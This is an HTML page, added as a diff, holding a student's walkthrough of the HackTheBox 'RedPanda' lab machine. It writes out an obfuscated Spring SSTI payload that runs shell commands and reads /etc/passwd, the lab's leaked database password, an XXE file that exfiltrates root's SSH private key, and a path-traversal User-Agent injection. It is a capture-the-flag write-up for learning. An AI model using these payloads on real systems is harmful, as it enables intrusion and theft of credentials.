@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html>
+<div id="particles-js">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <!--  Essential META Tags -->
+        <meta property="og:title" content="RedPanda HackTheBox Writeup">
+        <meta name="description" content="RedPanda HackTheBox Writeup">
+        <meta property="og:type" content="article" />
+        <meta property="og:image" content="/images/HTB/redpanda/RedPanda.png">
+        <!-- <meta property="og:url" content="https://0xv01d.github.io/hackthebox/trick"> -->
+        <meta name="twitter:card" content="/images/HTB/redpanda/RedPanda.png">
+
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+        <script src="/Scripts/js/particles.js"></script>
+        <script src="/Scripts/js/app.js"></script>
+        <title>RedPanda HTB Writeup</title>
+        <meta property="og:locale" content="en_US">
+        <script type="application/ld+json">
+</script>
+
+        <link rel="stylesheet" href="/Styles/style.css?v=">
+        <link rel="stylesheet" href="/Styles/highlight_monokai.css">
+        <!-- Setup Google Analytics -->
+
+        <link rel="shortcut icon" type="image/x-icon" href="/images/HTB/redpanda/favicon.ico">
+
+        <!--Information SideBar-->
+        <header class="app-header">
+            <a href="https:gaberoy01.github.io">
+                <img class="avatar" src="/images/index/avatar.png">
+            </a>
+            <p></p>
+            <h1><strong>Gabe's Writeups</strong></h1>
+            <nav class="app-header-menu">
+                <a class="app-header-menu-item" href="/">Home</a>
+                -
+                <a class="app-header-menu-item" href="#">Tags</a>
+                -
+                <a class="app-header-menu-item" href="#">About</a>
+            </nav>
+            <p>Bradley University Cybersecurity Club</p>
+            <!--Contact me-->
+            <div class="app-header-media">
+                <a class="fab fa-github-square" href="https://github.com/GabeRoy01" rel="noreferrer noopener"
+                    target="_blank"><img src="/images/index/github.png"></a>
+                <<!-- a class="fab fa-envelope-square" href="mailto:im_0xv01d@outlook.com" rel="noreferrer noopener"
+                    target="_blank"><img src="/images/index/email.png"></img></a> -->
+                    <!-- <a href="https://discord.com/users/504974900239400961" class="fab fa-discord" rel="noreferrer noopener" target="_blank"></a> -->
+                    <!-- <a class="fab fa-twitter-square" href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a> -->
+            </div>
+            <a href="https://app.hackthebox.com/profile/682451" rel="noreferrer noopener" target="_blank">
+                <img src="http://www.hackthebox.eu/badge/image/682451" alt="Hack The Box">
+            </a>
+            <div style="height: 7rem;"></div>
+        </header>
+
+        <main class="app-container">
+
+
+            <!--Machine Title-->
+            <div class="title">Redpanda Walkthrough</div>
+            <!--Skill Tags-->
+            <div class="tag-skills">
+                <svg class="icon icon-tag svg-tag" fill="none" height="24" stroke="currentColor" stroke-linecap="round"
+                    stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="24"
+                    xmlns="http://www.w3.org/2000/svg">
+                    <title>tag</title>
+                    <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
+                    <line x1="7" x2="7.01" y1="7" y2="7"></line>
+                </svg>
+                <a class="tag" href="#">XXE</a>
+                <a class="tag" href="#">SSTi</a>
+                <a class="tag" href="#">Web</a>
+            </div>
+
+            </header>
+
+            <!--Machine Card-->
+            <div><img class="machine-card" style="max-width: 594px;" src="/images/HTB/redpanda/RedPanda.png"></img></div>
+
+            <!--Machine Overview
+			<div class="subtitle">Trick Overview</div>
+			<p class="paragraph"><a href="https://app.hackthebox.com/machines/Trick" rel="noreferrer noopener" target="_blank">Trick</a> machine on HackTheBox, submitted by 
+			<a href="https://app.hackthebox.com/users/184611" rel="noreferrer noopener" target="_blank">Geiseric</a>. The machine starts from a web server running nginx,
+			eventually leading to <a href="https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/" rel="noreferrer noopener" target="_blank">Domain Zone Transfer attack via AXFR</a>, exposing a new domain vulnerable to <a href="https://portswigger.net/web-security/sql-injection" rel="noreferrer noopener" target="_blank">SQL injection</a>.
+			From which configuration files can be enumerated which eventually lead to LFI and gain access via ssh, and finally abusing sudoers <a href="https://oklencodes.gitbook.io/untitled/ctfs/biteme-ctf/fail2ban-privilege-escalation" rel="noreferrer noopener" target="_blank">fail2ban</a> privileges.
+        -->
+            <!--Machine Resolution-->
+            <!-- <h1 id="header-1">Recon</h1> -->
+
+            <p>Let's start with a port scan</p>
+
+            <div class="language-plaintext highlighter-rouge">
+                <div class="highlight">
+                    <pre class="highlight"><code>
+<span class="na">$</span><span class="ld"><span class="kt"> nmap </span>-sC -Pn panda.htb
+PORT     STATE SERVICE
+22/tcp   open  ssh
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+8080/tcp open  http-proxy
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Red Panda Search | Made with Spring Boot
+</span> </code></pre>
+                </div>
+            </div>
+
+            <p class="head-img">Let's go check out the open port on 8080:</p>
+
+            <img class="img-post" style="max-width: 900px;"
+                src="/images/HTB/redpanda/pandapage1.png"></img>
+
+            <p class="head-img">Looking at the contents of searching 'genius' in the burpsuite repeater:</p>
+
+            <img class="img-post" style="max-width: 900px;"
+            src="/images/HTB/redpanda/redpandaburp1.png"></img>
+
+            <p class="head-img">Trying a few different different injection types in the name field, SSTI for the ASP.NET Razor template engine seems to do the trick: </p>
+
+            <img class="img-post" style="max-width: 900px;"
+            src="/images/HTB/redpanda/pandaburp2.png"></img>
+
+            <p class="head-img">After looking around on github for SSTI payloads, I settled on this one I found:</p>
+
+
+            <div class="language-plaintext highlighter-rouge">
+                <div class="highlight">
+                    <pre class="highlight"><code>
+<span class="na"></span><span class="ld"><span class="kt">  </span> 
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+</span> </code></pre>
+
+<p class="head-img">As you can see, it is pretty long and difficult to read. Even more difficult to make yourself. Thankfully, there is a super useful python script on github you can use to generate these: <a href="https://github.com/VikasVarshney/ssti-payload"
+    rel="noreferrer noopener"
+    target="_blank">SSTi-Payload Python</a></p>
+
+
+<p class="head-img">Using this script would make this: </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">$</span><span class="ld"><span class="kt"> cat </span> /home/woodenk/user.txt 
+</span> </code></pre>
+
+<p class="head-img">Turn into this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na"></span><span class="ld"><span class="kt">  </span> 
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(116))).getInputStream())}</span> </code></pre>
+
+
+<p class="head-img">You can request this in your browser or through burp to get the requested information.</p>
+
+<p class="head-img">We can continue using this time-consuming method to navigate, or yo could make a script to automate this process. Regardless, after some looking around we find this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">$</span><span class="ld"><span class="kt"> cat </span>  ../../opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
+~~SNIP~~
+
+           conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/red_panda&quot;, &quot;woodenk&quot;, &quot;RedPandazRule&quot;);
+            stmt = conn.prepareStatement(&quot;SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?&quot;);
+
+~~SNIP~~
+</span> </code></pre>
+
+<p class="head-img">There is a bunch of stuff here, I recommend copying the file onto your system so we can look at it later. Just by scrolling a little bit we find a login for the woodenk user which we can try to ssh with.</p>
+
+
+<p class="head-img">Now that you've gotten in as Woodenk on SSH, let's see if LinPEAS shows us anything interesting:</p>
+
+<img class="img-post" style="max-width: 900px;"src="/images/HTB/redpanda/pandalinpeas.png"></img>
+
+<p class="head-img">Let's try and see what 'cleanup.sh' is for:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">woodenk@redpanda$</span><span class="ld"><span class="kt"> cat </span>/opt/cleanup.sh
+
+#!/bin/bash
+/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
+/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
+/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
+/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
+
+</span> </code></pre>
+
+
+<p class="head-img">We see that the script is removing .jpg and .xml files from a few of the directories we have privileges in. What is the point of deleting these files? We can look around in the place we found credentials to investigate further.  </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">woodenk@redpanda$</span><span class="ld"><span class="kt"> cat </span> /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
+
+---SNIP---
+
+@GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE) 
+public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) 
+throws IOException { System.out.println("Exporting xml of: " + author); if(author.equals("woodenk") || author.equals("damian")) 
+{ InputStream in = new FileInputStream("/credits/" + author + "_creds.xml"); System.out.println(in); 
+return IOUtils.toByteArray(in); } else { return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r"); } }
+
+---SNIP---
+
+</span> </code></pre>
+
+<p class="head-img"> So, the 'author' field needs to be from either woodenk or daimian when we are trying to export xml files. </p>
+<p class="head-img">We want to look into some more of the .java files and see what we can learn about these xml and jpg files being deleted:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">woodenk@redpanda$</span><span class="ld"><span class="kt"> cat </span>/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java
+
+---SNIP---
+
+public static String getArtist(String uri) throws IOException, JpegProcessingException
+    {
+        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
+        File jpgFile = new File(fullpath);
+        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
+        for(Directory dir : metadata.getDirectories())
+        {
+            for(Tag tag : dir.getTags())
+            {
+                if(tag.getTagName() == "Artist")
+                {
+                    return tag.getDescription();
+                }
+            }
+        }
+
+        return "N/A";
+    }
+
+---SNIP---
+
+</span> </code></pre>
+
+<p class="head-img">Here we see that it will only use .jpg files that have their *Artist* attribute set.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">woodenk@redpanda$</span><span class="ld"><span class="kt"> cat </span>/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java
+
+---SNIP---
+
+public static Map parseLog(String line) { 
+	String[] strings = line.split("\\|\\|"); 
+	Map map = new HashMap<>(); 
+	map.put("status_code", Integer.parseInt(strings[0])); 
+	map.put("ip", strings[1]); 
+	map.put("user_agent", strings[2]); 
+	map.put("uri", strings[3]); 
+	return map; 
+}
+
+--SNIP---
+
+</span> </code></pre>
+
+<p class="head-img">Here we can see how the input strings are split into four parts using '||' as a delimiter.  </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">woodenk@redpanda$</span><span class="ld"><span class="kt"> cat </span>/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java
+
+public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
+    File log_fd = new File("/opt/panda_search/redpanda.log");
+    Scanner log_reader = new Scanner(log_fd);
+    while(log_reader.hasNextLine())
+    {
+        String line = log_reader.nextLine();
+        if(!isImage(line))
+        {
+            continue;
+        }
+        Map parsed_data = parseLog(line);
+        System.out.println(parsed_data.get("uri"));
+        String artist = getArtist(parsed_data.get("uri").toString());
+        System.out.println("Artist: " + artist);
+        String xmlPath = "/credits/" + artist + "_creds.xml";
+        addViewTo(xmlPath, parsed_data.get("uri").toString());
+    }
+
+}
+</span> </code></pre>
+
+
+<p class="head-img">Here we can see the main function that calls the other ones. It calls the parseLog function from earlier as well at the getArtist functions. This sets a path for an xml file that is in the /credits directory that will be named *artist_creds.xml*. </p>
+
+<p class="head-img">If you saw the logs in /opt/panda_search/redpanda.log, you can see that 'splitting' we say in the parseLog function. </p>
+<p class="head-img">First, we need to get a better understanding of what XML XXE is:
+<br>&rarr; This youtube video is fantastic at explaining the concept: <a href="https://www.youtube.com/watch?v=gjm6VHZa_8s&t=833s"
+rel="noreferrer noopener"target="_blank">XXE ~ PwnFunction & John Hammond
+</a><br>&rarr; To summarize, we are going to make an XML document that stores the root user's ssh key as a variable (referred to in XML as an entity) so that when the xml document is used, the entity in the function body of the XML will be replaces with the ssh key. </p>
+
+
+<img class="img-post"style="max-width: 700px;"src="/images/HTB/redpanda/exiftool.png"></img>
+
+<p class="head-img">&rarr; We know that by using the artist 'genius' it will later add '_creds.xml' to the end. <br>&rarr; Next, we want to make an XML file that will be targeted.  </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">woodenk@redpanda$</span><span class="ld"><span class="kt"> pwd </span>
+
+/home/woodenk
+
+<span class="na">woodenk@redpanda$</span><span class="ld"><span class="kt"> ls </span>
+
+genius_creds.xml  genius.jpg  user.txt
+
+<span class="na">woodenk@redpanda$</span><span class="ld"><span class="kt"> cat </span> genius_creds.xml
+
+&lt;!--?xml version="1.0" ?--&gt;
+&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa"&gt; ]&gt;
+&lt;credits&gt;
+&lt;author&gt;damian&lt;/author&gt;
+&lt;image&gt;
+&lt;uri&gt;/../../../../../../../home/woodenk/genius.jpg&lt;/uri&gt;
+&lt;hello&gt;&ent;&lt;/hello&gt;
+&lt;views&gt;0&lt;/views&gt;
+&lt;/image&gt;
+&lt;totalviews&gt;0&lt;/totalviews&gt;
+&lt;/credits&gt;
+</span> </code></pre>
+
+
+
+<p class="head-img">You can then request to see the image in thr browser with curl to try and execute our malicious xml file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">$</span><span class="ld"><span class="kt"> curl </span> http://10.10.11.170:8080 -H "User-Agent: ||/../../../../../../../home/woodenk/genius.jpg"
+</span> </code></pre>
+
+
+<p class="head-img">Once we have both files in our home directory and are ready to give it a try, we want to make a curl command that specifies our file. We can then go to the stats page on the target page and export the table to make call the functions we went over earlier. If everything goes as planned, the site will try and give us the image, and because we already have that creds xml file, it will be parsed correctly and then when we go to the site and export the tables, our XML external entity will be updated to include the target information:</p>
+
+<img class="img-post"style="max-width: 700px;"src="/images/HTB/redpanda/privkey.png"></img>
+
+<p class="head-img">We can then copy this key to a file called id_rsa, change its permissions to 600, and use it to ssh in as root. </p>
+
+<div class="highlight"><pre class="highlight"><code>
+<span class="na">$</span><span class="ld"><span class="kt"> ssh </span>-i id_rsa root@panda.htb
+
+root@redpanda:~$ whoami
+root
+</span> </code></pre>
+
+
+</main>
+</body>
+</div>
+
+</html>
